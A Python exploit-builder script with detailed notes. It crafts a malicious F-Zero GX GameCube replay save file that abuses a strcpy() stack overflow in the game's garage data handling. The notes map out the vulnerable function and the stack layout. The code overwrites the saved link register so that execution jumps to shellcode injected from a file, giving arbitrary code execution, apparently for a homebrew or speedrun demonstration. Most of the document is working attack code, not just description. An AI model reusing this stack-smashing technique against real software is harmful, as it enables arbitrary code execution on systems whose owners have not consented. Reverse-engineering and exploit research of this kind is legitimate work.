#!/bin/python

'''
IMPORTANT:
The precise mechanics of the stack-smashing are from Numbers' original PoC.

DESCRIPTION:
Prepares a block of raw garage data for exploiting the strcpy() calls made by
the function at 8030a8c4, then injects some loader shellcode from a file.

COLLECTED NOTES:
Basically, the byte at offset 0x81a4 [and 0x81b4?] in decoded garage data 
(resident in GCN RAM immediately after selecting the REPLAY menu) is
multiplied by 24 in order to obtain an offset into a table of pointers to 
some structs describing machine data. These pointers are used as the source 
for calls to a strcpy() onto the stack, eventually for rendering menu text.

Values greater than 0x4a cause us to load some word of data outside the table
to-be-dereferenced by the calls to strcpy(). Interestingly, some fragments of
[user-controlled] decoded garage data lie within reach. For example, the word
at offset 0x7f40 in decoded garage data is dereferenced by strcpy() when the
indicies are set to 0x84, allowing us control over strcpy()'s source pointer. 

In this case, the destination pointer for the strcpy() is 0x801b66dc -- the 
stack pointer associated with strcpy()'s caller (the function at 8030a8c4).
This is what the stack looks like before the call to strcpy():

	801b66dc: <some data>
	.
	.
	.
	801b6720: 801b6fa4 
	801b6724: 8036be18 
	801b6728: 801b6ed8 
	801b672c: 80309564 <== Saved LR, after branch in 803094f0

The strcpy() call terminates after reading a NUL byte -- however, if the data 
behind the source pointer is not NUL-terminated, strcpy() will read up to 0x50 
bytes. This turns out to be exactly enough bytes to write over the saved link 
register with some arbitrary data from [user-controlled] decoded garage data.

This is a textbook stack-smashing attack, and, considering that the placement 
of garage data in memory is always deterministic, should be a reliable way to 
execute arbitrary code. 
'''

import sys
import hexdump
from struct import *

from fgx_encode import *
from fgx_format import *

if len(sys.argv) < 4:
    print("prepare-ace.py <input GCI> <shellcode.bin> <output GCI>")
    exit(-1)

input_fn        = sys.argv[1]
shellcode_fn    = sys.argv[2]
output_fn       = sys.argv[3]

# -----------------------------------------------------------------------------
# Import a GCI
input_gci = gci(input_fn)
print(input_gci.get_filename())
if input_gci.get_blocksize() < 8:
    print("This isn't an 8-block replay GCI, or your dentry is corrupted.")
    exit(-1)

# -----------------------------------------------------------------------------
# Decode the replay data, get decoded representation of data
my_decoder = decoder(input_gci.get_replay_data())
my_replay = my_decoder.dump()

if (my_replay.player_array_dict[0]['is_custom_ship'] == 0):
    print("This GCI doesn't have the garage data bit set.")
    exit(-1)

# You can use this to write the original garage data to a file, if necessary
#with open("/tmp/garage.raw", "wb") as g:
#    g.write(new_garage_data)

# -----------------------------------------------------------------------------
# Import garage data from the GCI, then overlay data on it

new_garage_data = my_replay.player_array_dict[0]['custom_ship_data']

# Total raw garage data length
TOTAL_LEN = 0x81C0

# Base of the garage data buffer in GCN RAM
INPUT_BASE = 0x801af4d0

STRCPY_SIZE         = 0x50
STRCPY_OFFSET       = 0x50
STRCPY_OFFSET_END   = STRCPY_OFFSET + STRCPY_SIZE

# Address in GCN RAM pointing to some data we want to strcpy() onto the stack
STRCPY_PTR          = INPUT_BASE + STRCPY_OFFSET

SHELLCODE_OFFSET    = 0x100
SHELLCODE_PTR      = INPUT_BASE + SHELLCODE_OFFSET
SHELLCODE_SIZE      = os.stat(shellcode_fn).st_size
SHELLCODE_OFFSET_END = SHELLCODE_OFFSET + SHELLCODE_SIZE
if (SHELLCODE_SIZE < 4):
    print("no shellcode")
    exit(-1)

new_garage_data[0x50:0x90] = b'SGDQ2018' * 8
new_garage_data[0x90:0x94] = pack(">L", 0x801b6fa4)
new_garage_data[0x94:0x98] = pack(">L", 0x8036be18)
new_garage_data[0x98:0x9c] = pack(">L", 0x801b6ed8)
new_garage_data[0x9c:0xa0] = pack(">L", SHELLCODE_PTR)

with open(shellcode_fn, "rb") as g:
    shellcode = g.read()
new_garage_data[SHELLCODE_OFFSET:SHELLCODE_OFFSET_END] = shellcode

# This word of data is used as the source pointer to strcpy() if the indicies
# below are set to 0x84 within the raw garage data
new_garage_data[0x7f40:0x7f44] = pack(">L", STRCPY_PTR)

# Indicies into a table of pointers which *must* be set to 0x84 in order to 
# control strcpy()'s source pointer with the word at offset 0x7f40
new_garage_data[0x81a4:0x81a5] = b'\x84'
new_garage_data[0x81b4:0x81b5] = b'\x84'

hexdump.hexdump(new_garage_data)

# Write garage data back into the player_array entry
my_replay.player_array_dict[0]['custom_ship_data'] = new_garage_data

# Don't encode any replay_array data; might be useful if we want to store more
# shellcode in the replay file somewhere after the garage data
#my_replay.replay_array_entries = 0
#my_replay.replay_array_dict = []
#my_replay.unk_one_bit_array = []
#my_replay.unk_two_bit_array = []
#my_replay.total_frames = 0
#my_replay.unk_array_entries = 0
#my_replay.unk_array = []

# -----------------------------------------------------------------------------
# Re-encode the replay data
my_encoder = encoder()
new_replay_data = my_encoder.encode_gci(my_replay)

# Concatenate new replay data to the rest of the original GCI
input_gci.set_replay_data(new_replay_data)

# Recompute the checksum of the whole GCI, force region to NTSC
input_gci.recompute_checksum()
input_gci.set_region(region.ntsc)

# Write the new GCI to a file
print("Writing to {}".format(output_fn))
ofd = open(output_fn, "wb")
ofd.write(input_gci.raw_bytes)
ofd.close()
